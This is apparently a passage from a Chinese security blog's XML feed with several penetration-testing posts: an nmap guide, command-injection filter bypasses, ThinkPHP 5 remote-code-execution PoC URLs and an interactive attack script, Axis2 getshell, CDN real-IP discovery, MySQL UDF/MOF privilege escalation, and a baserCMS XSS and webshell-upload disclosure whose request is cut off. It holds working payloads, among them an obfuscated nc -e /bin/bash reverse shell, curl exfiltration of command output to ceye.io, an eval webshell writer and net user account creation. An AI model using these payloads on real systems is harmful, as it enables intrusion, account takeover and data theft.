2、将apk解包,通过控制app的证书信任机制再重打包安装进行抓包：123456789在res/xml/network_security_config.xml中加入：&lt;network-security-config&gt; &lt;debug-overrides&gt; &lt;trust-anchors&gt; &lt;!-- Trust user added CAs while debuggable only --&gt; &lt;certificates src=&quot;user&quot; /&gt; &lt;/trust-anchors&gt; &lt;/debug-overrides&gt; &lt;/network-security-config&gt; 然后在app的manifest文件中引入上面的文件：12345&lt;manifest ... &gt; &lt;application android:networkSecurityConfig=&quot;@xml/network_security_config&quot; ... &gt; ... &lt;/application&gt;&lt;/manifest&gt; 这里有个前提，重打包过程ok。不然坑很多。 3、对不走代理的app就只能借助手机中Http Catcher这类软件了。可对多种软件进行抓包。自行下载：https://github.com/JZ-Darkal/AndroidHttpCapture/releases 4、对于微信小程序抓包，也可以安装微信电脑测试版，可以支持打开小程序，用fiddler就可以直接抓包。]]></content>
      <categories>
        <category>终端安全</category>
      </categories>
      <tags>
        <tag>app攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试利器--nmap]]></title>
    <url>%2F2019%2F03%2F14%2Fnmap%2F</url>
    <content type="text"><![CDATA[介绍Nmap Free Security Scanner, Port Scanner, &amp; Network Exploration Tool. Download open source software for Linux, Windows, UNIX, FreeBSD, etc. 本文主要用以总结nmap使用技巧与探测方法 主要参数以及扫描方式：1 Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描。Nmap发送SYN包到远程主机，它不会产生任何会话.不需要通过完整的握手，就能获得远程主机的信息。因此不会在目标主机上产生任何日志记录。Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.需要root/administrator权限.nmap -sS 192.168.1.0/24进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。 12345678nmap -sS 192.168.1.0/24You requested a scan type which requires root privileges.QUITTING!~ ⍉▶ sudo nmap -sS 192.168.1.0/24Password:Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:49 CST 2 Tcp connect() scan(sT)如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求底层的操作系统通过发出连接系统调用来建立与目标机和端口的连接。nmap -sT 192.168.1.0/24 3 Udp scan(sU) UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口:nmap -sU 192.168.1.0/24使用UDP ping探测主机：nmap -PU 192.168.1.0/24 4 FINscan(sF)有时候TcpSYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.FIN扫描也不会在目标主机上创建日志 5 PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.nmap -Pn 192.168.1.0/24 （不进行ping，突破防火墙）-PA TCP Ack Ping 扫描。-PY 包含一个最小的INIT块的SCTP包 找到使用流控制传输协议（SCTP）主机。-PE 将对指定主机执行ICMP（互联网控制消息协议）回显Ping-PP 执行一次ICMP时间戳ping。-PM 进行ICMP 地址掩码 ping.-PO 执行IP协议Ping扫描-PR 选项指示的Nmap对指定目标执行ARP（地址解析协议）ping操作-Pn ～～不进行ping主机～～不进行主机存活发现（ps:nmap使用四种技术进行主机存活发现（icmp echo request、TCP SYN 、TCP ACK、ICMP timestamp request—-多谢香君、东城师父）-PS TCP SYN Ping 扫描 6 Idlescan(sL)Idlescan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包仅列出指定网络上的每台主机，不发送任何报文到目标主机：nmap -sL 192.168.1.0/24 7 版本检测(sV)版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口. 8 Nmap的OS检测（O）(“-osscan-guess”)Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。Nmap的操作系统指纹识别技术：设备类型（路由器，工作组等）运行（运行的操作系统）操作系统的详细信息（操作系统的名称和版本）网络距离（目标和攻击者之间的距离跳）如果远程主机有防火墙，IDS和IPS系统，你可以使用-Pn命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.nmap -O -Pn X.X.X.X 9 SCTP INIT扫描SCTP（Stream Control Transmission Protocol，流控制传输协议）是IETF（Internet Engineering Task Force，因特网工程任务组）在2000年定义的一个传输层（Transport Layer）协议。SCTP可以看作是TCP协议的改进，它改进了TCP的一些不足，SCTP INIT Ping扫描通过向目标发送INIT包，根据目标主机的相应判断目标主机是否存活。nmap -PY -v 192.168.1.1 其他参数：-sX： XmasTree scan 设置FIN，PSH，URG和标志。-sN： Null 扫描模式,不设置任何位（TCP标志标头是0）。用于逃脱一些防火墙和包过滤软件能够对发送到被限制端口的SYN数据包进行的监视-sF: FIN扫描 设置只是TCP FIN位。–sA: TCP ACK 扫描 没有判断端口的开放情况。它是用来绘制出防火墙规则，对哪些端口进行了保护。-S ip: 伪装源ip进行扫描，需要使用使用–e指定网卡并且使用-Pn参数-scanflag 自定义扫描类型 通过指定任意TCP标志来设计自己的扫描nmap -e 目标网卡 目标ip -S 伪装ip -Pnnmap -iflist：查看本地路由与接口-b 使用FTP bounce scan扫描方式 nmap常用扫描方式：ping扫描（-sP)nmap -sP target ping 扫描，检测存活性。12345678910111213▶ nmap -sP 192.168.1.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:44 CSTNmap scan report for 192.168.1.1Host is up (0.024s latency).Nmap scan report for 192.168.1.100Host is up (0.029s latency).Nmap scan report for 192.168.1.103Host is up (0.010s latency).Nmap scan report for 192.168.1.112Host is up (0.0018s latency).Nmap scan report for 192.168.1.119Host is up (0.041s latency).Nmap done: 256 IP addresses (5 hosts up) scanned in 9.53 seconds 同时可以使用CIDR表示整个子网，可以使用-exclude 排除单个ip扫描txt文件内的主机：nmap -iL txt 需要txt与nmap在同一个目录下 traceroute 可被用于跟踪的网络路径指定的主机-r 指示的Nmap始终执行对目标IP地址的反向DNS解析。-r在对一个IP段进行侦查时非常有用，Nmap将尝试查询每个ip地址的反向DNS信息-n 用于禁用反向DNS解析-system-dns 指示NMAP使用主机系统自带的DNS解析器，而不是其自身内部的方法-dns-servers 用于扫描时手动指定DNS服务器进行查询。使用znmap可方便记住命令。nmap -A 192.168.1.19 (执行路由跟踪等)另外，nmap官方文档中的例子：nmap -v ip/domain这个选项扫描主机scanme中所有的保留TCP端口。选项-v启用细节模式。nmap -sS -O ip/24确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等):nmap -sO 192.168.1.19 nmap脚本使用：1、增加脚本：首先可以将写好或者收集好的脚本置于$ Nmap_DATA/nselib/data/文件夹中然后执行Nmap -script-updatedb命令更新数据库即可使用脚本2、本地脚本分类与说明：auth: 负责处理鉴权证书（绕开鉴权）的脚本broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute: 提供暴力破解方式，针对常见的应用如http/snmp等default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源，例如进行whois解析fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware: 探测目标机是否感染了病毒、开启了后门等信息safe: 此类与intrusive相反，属于安全性脚本version: 负责增强服务与版本扫描（Version Detection）功能的脚本vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_0673、脚本编写： 经验与bypass技巧：一般ids不会记录sS扫描方式，但是默认的sT一般会被察觉。使用nmap -f host 其他：1、NMAP时间设置：Nmap -T [0-5]目标0:最缓慢的&lt;bypass waf or ids&gt; ------&gt; 4/5:加速扫描、最快速度扫描2、扫描的并发设置以及主机分组设置：1234Nmap -min-parallelism [数量] [目标] 并发端口扫描的最小数量Nmap -max-parallelism [数量] [目标] 最大数量Nmap -max-hostgroup [数目] [目标] 并发扫描主机数的最大值Nmap -min-hostgroup [数目] [目标] 并发扫描主机数的最小值 3、RTT超时设置Nmap -initial-rtt-timeout [时间] [目标] 控制网络响应初始超时Nmap -max-rtt-timeout [时间] [目标] 指定最大RTT数据包响应超时，对于扫描大块地址可适当提高以防止nmap断开4、TTL设置Nmap -ttl [时间] [目标]: TTL用于指定扫描中的TTL值5、其他：1234567Nmap -max-retries [数目] [目标]: 每个探针的最大重传次数Nmap -scan-delay [时间] [目标]: 指定扫描延迟指示的Nmap在发送探针之间的指定的最小时间间隔是多久Nmap -host-timeout [时间] [目标]：指定Nmap在超时多少时间后放弃对主机的扫描Nmap -max-scan-delay [时间] [目标]：Nmap在发送探针之间的指定的最大时间间隔是多久。Nmap -min-rate [数量] [目标]：Nmap每秒钟发送的数据包数量最小是多少。Nmap -max-rate [数量] [目标]：Nmap每秒钟发送的数据包数量最大是多少Nmap -defeat-rst-ratelimit [目标]：在目标通过发送RST包来限制扫描速率的情况下非常有用，它可以加快扫描速度，然而会影响结果的准确度。 小技巧：1、mac下建议扫描端口前加上sudo，有可能由于权限问题无法深入检测端口。2、扫描过程中加上-n 可禁止反向dns解析，增加速度3、使用–packet-trace 进行数据包跟踪。未完待续 参考官方书籍： https://nmap.org/book/intro.htmlNmap备忘单：https://www.freebuf.com/sectool/101335.html脚本开发：http://www.freebuf.com/sectool/177300.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>信息收集</tag>
        <tag>端口探测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行的一些总结与tips]]></title>
    <url>%2F2019%2F01%2F15%2FCommand%20execution%20summary%20and%20tips%2F</url>
    <content type="text"><![CDATA[之前有做过一些笔记，加上需要做了一些题，综合网上的一些姿势总结一下： 命令执行的函数：php: system()、shell_exec()、exec()、passthru()、popen()、proc_open()、pcntl_exec()，dl()python: eval()、os.system（）、os.Popen（）、subprocess.Popen（）、subprocess.call(xx，shell=True)、commands.getstatus/output（）java: 存在Runtime类，在该类中提供了exec方法用以在单独的进程中执行特定的字符串命令other: ImageMagick组件等漏洞、bash漏洞、struts2系列、tp命令执行等 绕过技巧：1、命令分隔符：123456%0a、%0d 换行符与回车符（php环境）| 第一条命令结果作为第二条命令的输入(eg.:ls|&gt;./a.txt)|| 第一条执行失败，执行第二条命令（eg.:xx||ls); 连续指令功能。&amp; 连接的两条命令都会执行&amp;&amp; 当第一条执行成功猜执行后续命令 2、绕过空格: 123456&lt; 重定向（eg.: cat&lt;flag.php)&lt;&gt; 重定向 （eg.: ls&lt;&gt;a.txt)$IFS$9 (Ubuntu下测试通过)后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php$&#123;IFS&#125; （Ubuntu下测试通过)单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php%09 php环境下可替代空格。php7.1 测试失败。$IFS ubuntu测试通过 3、命令结束符号：12%00 -- 需要php环境%20# -- 需要php环境 4、黑名单绕过1）通配符利用：12???/??t /???/p??s?? ==&gt; /bin/cat /etc/passwd/???/n? -e /???/b??h 2130706433 1337 ==&gt; nc -e /bin/bash 127.0.0.1 1337 2）夹杂字符：1、单引号or双引号： cat /etc/passwd ==&gt; cat /e&#39;&#39;t&#39;&#39;c/p&#39;&#39;a&#39;ss&#39;&#39;w&#39;&#39;d&#39; OR ca&#39;&#39;t x&quot;&quot;.php2、空字符： Cat /etc/passwd ==&gt; cat$u /etc$u/passwd$u或者ca$1t /et$1c/passwd$u：($后仅能为数字)3、反斜杠\: l\s` 3）字符串拼接：12a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125; 4)从文件中获取拼接：1expr substr $(awk NR==1 test.php) 1 1（e.g：如下图） 5）编码：12345对php而言，可进行进制/字符转换：编码为8进制or 16进制，或者其他方式编码(Unicode)等采用base64编码也可以绕过waf关键字（一般可被检测）eg.echo &quot;d2hvYW1p&quot;|base64 -dcurl http://9sk1fm.ceye.io/$(id|base64)for l in `ls /root|base64 -w 100`; do curl http://127.0.0.1:9090/abr/$l; done; 6)反引号1aaa`whoami`;`ls` 7)ip中.绕过：将地址替换为数字地址：如127.0.0.1可以转化为2130706433（10进制or16进制0x7F000001）。在线地址：http://www.msxindl.com/tools/ip/ip_num.asp 8）无回显：vps监听端口，发curl请求(or:ceye.io)若curl、wget等命令被禁用，可通过ping vps ip 然后使用netstat -s -p icmp查看变化 9）windows下使用bat方式运行：12345678910&lt;?php$command = &apos;dir &apos;.$_POST[&apos;dir&apos;];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&apos;out.bat&apos;,$escaped_command);system(&apos;out.bat&apos;);?&gt;执行.bat文件的时候，利用%1a，可以绕过过滤执行命令.dir=../ %1a whoami 2、123for /F %x in (&apos;dir /b D:\&apos;) do ping -n 1 xxx.%x.xxx.ceye.ioor. do start 10)get_defined_functions(php环境)：通过调用系统函数php -r ‘print_r(get_defined_functions()[internal]);’后面添加[id](相应的命令) 11)长度限制的突破：1234echo &apos;&lt;?php&apos; &gt;1echo &apos;@eval(&apos; &gt;&gt;1echo &apos;$_POST[1]&apos; &gt;&gt;1echo &apos;); ?&gt;&apos; &gt;&gt;1 或者参考文章： http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/： 12）巧用字符数组（php的webshell篇,本文不作过多描述，参考链接：http://www.cnblogs.com/Littlehann/p/3522990.html） 13) 利用环境变量、或其他信息取字符12345678910▶ echo $path/Library/Frameworks/Python.framework/Versions/3.7/bin/python3/bin /Users/sunu11/tools/phantomjs/bin /Library/Frameworks/Python.framework/Versions/3.7/bin/python3/bin /Users/sunu11/tools/phantomjs/bin /Library/Frameworks/Python.framework/Versions/3.7/bin /usr/local/bin /usr/bin /bin /usr/sbin /sbin /Applications/VMware Fusion.app/Contents/Public /Applications/Wireshark.app/Contents/MacOS~▶ echo $&#123;PATH:83:1&#125;$&#123;PATH:84:1&#125;ls~▶ $&#123;PATH:83:1&#125;$&#123;PATH:84:1&#125;Applications Downloads Music 其他：1、一个读文件内容的集合： 12345678910111213141516171819202122232425file -f xxx --将显示在 FILE 列表中指定的每个文件的类型，间接可得到文件内容。zip -T --unzip-command &quot;sh -c id&quot; aa.zip aa.txt cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出strings ---打印文件中的可打印字符串(strings /etc/passwd)curl file:///etc/passwdsort -- 从最后一行开始读取文件find -- 列出当前目录下的文件以及子目录所有文件find . -type f -exec curl sd1.d.net &#123;&#125; \; find 执行命令&amp;&#123;grep,-nrw,.&#125; -- 递归读取当前目录下的文件以及子目录所有文件grep -r .. -- 列出当前目录下的所有文件以及内容&#123;cat,/etc/passwd&#125;curl file:///etc/passwdstrings /etc/passwduniq -c/etc/passwdbash -v /etc/passwdrev /etc/passwd 2、写文件名了1tee 只输出到标准输出 2、一个开源os命令注入payload生成器FUzzing: https://github.com/ewilded/shelling 3、参考链接：https://www.jianshu.com/p/5e505e3d8075https://www.anquanke.com/post/id/84920]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从thinkphp远程代码执行开始]]></title>
    <url>%2F2018%2F12%2F12%2F24%2F</url>
    <content type="text"><![CDATA[9号晚上thinkphp官网发布安全更新:https://blog.thinkphp.cn/869075修复了一处代码执行漏洞，影响没有开启强制路由的5.0 – V5.0.23版本与5.1 – V5.1.31版本thinkphp 开发站点。，简单记录一下近两天一些信息与心得。 thinkphp代码执行漏洞简述到现在这个点相信各大厂商都的waf都可以拦截这个攻击了，包括我司23333。之所以存在漏洞，关键在于框架对控制器名没有进行足够的检测，从补丁也能看出来。贴漏洞产生的部分关键代码：从下述代码可知，在当$name包含\则将其作为类名，如果$name可控，是可以实例化任何一个类的。 1234567protected function parseModuleAndClass($name, $layer, $appendSuffix) &#123; echo &apos;parseModuleAndClass:&apos;.$name.&quot;&lt;br&gt;&quot;; if (false !== strpos($name, &apos;\\&apos;)) &#123; $class = $name; $module = $this-&gt;request-&gt;module(); &#125; 而$name可控且\没被过滤，因此可以通过s=index/\think\Container/invokefunction的方式调用think\Container这个命名空间下的invokefunction函数。从而实现命令执行。 poc：123456789?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1?s=index/\think\Request/input&amp;filter=system&amp;data=id?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami?s=index/think\config/get&amp;name=database.password 检测脚本：避免其他问题，暂放一个github上的简单测试脚本：attack.py12345678910111213141516171819202122#author: ctudoudoufrom requests import getfrom argparse import ArgumentParserif __name__ == &apos;__main__&apos;: parser = ArgumentParser(prog=&apos;Test poc&apos;, usage=&apos;./attack.py [options: -u] &lt;url&gt;&apos;, description=&quot;The ThinkPHP test script&quot;) parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, help=&quot;attack url&quot;) args = parser.parse_args() while (True): url = &apos;&#123;&#125;?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&apos; \ &apos;&amp;vars[0]=system&amp;vars[1][]=&apos;.format(args.url)#可继续添加其他poc command = input(&quot;shell$ &quot;) if command != &quot;exit&quot;: payload = url + str(command) r = get(payload) print(r.text) else: break 自己简单写了一个综合检测的脚本：github: https://github.com/sunu11/thinkphpv5 修复官方现已推出补丁 建议开发者进行修复Thinkphp v5.0.x补丁地址: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756fThinkphp v5.1.x补丁地址: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815另外像这种漏洞是存在攻击特征的，基于正则的waf也可以进行拦截，因此有装了waf的升级规则库可保无碍，没安装的git pull 官方代码应该也还ok。关键是及时发现，及时处理。 其他漏洞1、phpmyadmin 官网也更新了，修复了三枚漏洞，文件包含、csrf、xss，可以及时关注一下。https://www.t00ls.net/articles-48952.html2、偶像Orange Tsai发了一条Twitter：1After weeks of diving into a single 500mb idb file. Finally chained a pre-auth RCE in a popular SSL VPN! 🙌 静候233333]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>phpmyadmin</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[其他分享的一些东西]]></title>
    <url>%2F2018%2F11%2F28%2Fohters%2F</url>
    <content type="text"><![CDATA[记录一下，方便以后查询。 代码审计ucms1.4.5后台sql注入漏洞 https://www.t00ls.net/thread-48432-1-1.htmlDedeCMS V5.7 SP2前台文件上传(需要后台权限CVE-2018-20129)复现分析 https://www.t00ls.net/thread-49086-1-1.html CTFH1 CTF Writeup(简单翻译）https://www.t00ls.net/thread-48659-1-1.html网鼎杯部分题writeup https://topsec.wiki/36t9aJda/?thread-495.htmEDU-CTF2018_Web:TwoFile https://www.t00ls.net/thread-49523-1-1.html learning papers常见未授权访问漏洞总结(小维)：https://xz.aliyun.com/t/6103Spring Boot漏洞:https://www.chabug.org/web/1795.htmlhttps://github.com/LandGrey/SpringBootVulExploit]]></content>
      <categories>
        <category>other</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Axis2恶意部署getshell]]></title>
    <url>%2F2018%2F11%2F03%2FAxis2%20getshell%2F</url>
    <content type="text"><![CDATA[简介以前遇到的，记录一下，便于以后查阅 过程一般默认的账号是admin密码是axis2，登陆后：点击upload service上传cat.aar文件，可看到上传成功。点击Available Services可选择可用的功能。主要功能有：1、getClassPath2、执行命令：参数:cmd=xxx3、反弹shell：https://192.168.86.254:8443/axis2/services/Cat/shell?host=x.x.x.x&amp;port=x4、写入shell或是写入文件https://192.168.86.254:8443/axis2/services/Cat/writeStringToFile?data=数据&amp;file=文件路径&amp;encoding=utf-8&amp;append=false 详细过程请参考：http://p2j.cn/?p=1533]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>axis2</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如果获取站点真实ip]]></title>
    <url>%2F2018%2F11%2F03%2FHow%20to%20get%20the%20real%20IP%20of%20the%20site%2F</url>
    <content type="text"><![CDATA[简介说到渗透测试，肯定有信息收集；信息收集就涉及服务器ip信息。而通常大型站点都通过了cdn、代理等手段隐藏。本文对这个老话题作一下个人的思路以及姿势总结。 姿势1、对于存在注册或者留言等能够让站点通过邮件联系的网站，通常可以通过站点发送的邮件找到服务器的真实ip，如bilibili.com：此方法是因为通常大部分公用SMTP服务在发信时邮件头会带上发件者ip，cdn的防护对这种方式完全没作用。解决方式可以参考此链接：https://www.v2ex.com/t/2767882、nslookup命令：对于bilibili.com 该方式同样实用，因为存在MX记录：也可以查找NS、TXT等其他记录进行真实ip的查找。另外还可以使用国外冷门的dns解析域名：nslookup xxx.com y.y.y.y 如果运气好，找到直接解析到服务器真实ip的dns服务器。一查就出来了。3、Ping：找二级域名，通过ping将网站的二级域名的ip逐个与目标域名相匹配，直到访问成功即可，还有ping秃域名(如对于www.baidu.com，对于ping baidu.com就是ping秃域名)，这类方式都是看管理员粗不粗心，如果能找到管理员没有使用cdn的域名，就能找到真实ip了。同样因为很多国内的CDN没有节点对国外服务，也可以使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：https://asm.ca.com/en/ping.php4、通过网站的缺陷与漏洞,比如寻找网站上的探针：phpinfo等，寻找网站上的xss、os injection、ssrf等一切可以让服务器主动访问我的vps的漏洞，并成功利用。通过查看日志或者vps的请求记录就能看到真实ip。5、通过大量信息收集，如通过其他第三方网站查看域名历史解析记录、域名历史信息历史漏洞或者二级域名等然后利用这些获取到的信息进行进一步的ip查找（灵活使用），这下面是常用的几个： 12345678https://bgp.he.net https://toolbar.netcraft.com/site_report?url=www.xxx.comhttp://www.17ce.comhttp://www.crimeflare.com/https://domainbigdata.com/goodmbi.comhttps://crt.sh/http://wooyun.jozxing.cc/https://fofa.so/ 最后的fofa是网上学到的姿势之一，通过fofa的HTML源代码检索，复制网页title或者其他信息放fofa进行检索，5173.com可以通过该方法找到真实ip但是前两天我需要查找源ip的网址使用该方法无效，此方法建立在通过fofa能检索到并且html标识够独特的基础下，个人感觉在没有思路的时候也可以试试，有待下一次实践。贴一张图：6、其他没尝试过的姿势：社工到cdn账号密码，怼进去看配置；zmap扫全网，匹配站点信息追溯真实ip；DDOS，把cdn打穿就会回源；通过DNS社工库，找对应的解析记录。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>fofa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql两种经典提权方式]]></title>
    <url>%2F2018%2F11%2F03%2FClassic_elevation_of_authority_record%2F</url>
    <content type="text"><![CDATA[udf提权条件：1、系统版本（Windows2000，XP,Win2003);2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限。3、具有root账号密码首先导出udf：MYSQL5.1以上版本，需要把udf.dll文件存放到MSYSQL安装目录下的lib\plugin文件夹下。在mysql命令行输入：@@basedir1show variables like &apos;%plugins%&apos; 然后提权：12345create function cmdshell returns string soname &apos;udf.dll&apos;select cmdshell(&apos;net user xxx xxx /add&apos;);select cmdshell (&apos;net localgroup administrators xxx /add&apos;);drop function cmdshell; **returns string soname ‘导出的DLL路径’ mof提权以下为创建xxx用户的mof文件，使用sql执行load_file及into dumpfile 把文件导出到正确位置，执行即可。12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter&#123; EventNamespace = &quot;Root\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;;&#125;; instance of ActiveScriptEventConsumer as $Consumer&#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxx xxx /add\&quot;)&quot;;&#125;; instance of __FilterToConsumerBinding&#123; Consumer = $Consumer; Filter = $EventFilter;&#125;; 执行sql命令：select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;; 在可控数据库的情况下也可以直接写入：select char(将上述exp asc编码写入) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;; 以上均为新建账号，还需要修改代码将xxx用户加入administrators，重新写入一遍即可。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[baserCMS 漏洞披漏]]></title>
    <url>%2F2018%2F10%2F31%2FbaserCMS%2F</url>
    <content type="text"><![CDATA[DescriptionbaserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。 オープンソース・フレームワーク「CakePHP」をベースとしているので、カスタマイズ性、メンテナンス性が高いのが特徴です。 ツリー構造により固定ページ、ブログ、フォームをまとめて管理できる、強力なコンテンツ管理機能を持つCMSです。Webサイトに最低限必要となるメールフォームや新着ブログなどのプラグインや管理画面の枠組みを最初から装備しており、スマートフォンにも標準対応しています。 マニュアルやソースコードのコメントにおいて日本語を標準としているのも国産CMSの強みです。 ———— it’s copy from https://basercms.net/about/index.html I found two vulnerability in basicCMS 4.1.3. storage xss vulnerability（fixed）There is a storage xss vulnerability in the category name editor after login with normal administrator privileges. ExampleWe register two administrator accounts with different permissions：システム管理 and サイト運営Log in to the system using サイト運営 privileged account root:In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:After the administrator logs in, accessing the page triggers:So，We can insert malicious javascript according to the vulnerability to override the administrator function.For exampleThe root user does not have permission to access“http://127.0.0.1/basercms/admin/site_configs/del_cache” to delete the server cache information:We can exploit this vulnerability to implement an attack:Since the data[UploaderCategory][name] parameter has a length limit, We can insert the following statement first:&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;Then, 1.js uses ajax to write a get request tohttp://127.0.0.1/basercms/admin/site_configs/del_cache:Verify: The root (asda)user refreshes the page:And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.Finally, I found the corresponding code with defects.UploaderCategoriesController.phpIt was found that the カテゴリ名（data[UploaderCategory][name]）parameter submitted by the user did not filter the malicious characters, Solution:Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. Announcement address Code Execution Vulnerability（fixed）ProcessDownload the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly. In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:We can seen move_uploaded_file method，Then audit code，It can be seen that the image is saved here and the suffix is not verified.，Only limited the image name (logo)，So you can get server permissions by uploading php webshell.Poc：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051POST /basercms/admin/theme_configs/form HTTP/1.1Host: 127.0.0.1Content-Length: 3986Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/basercms/admin/theme_configs/formAccept-Encoding: gzip, 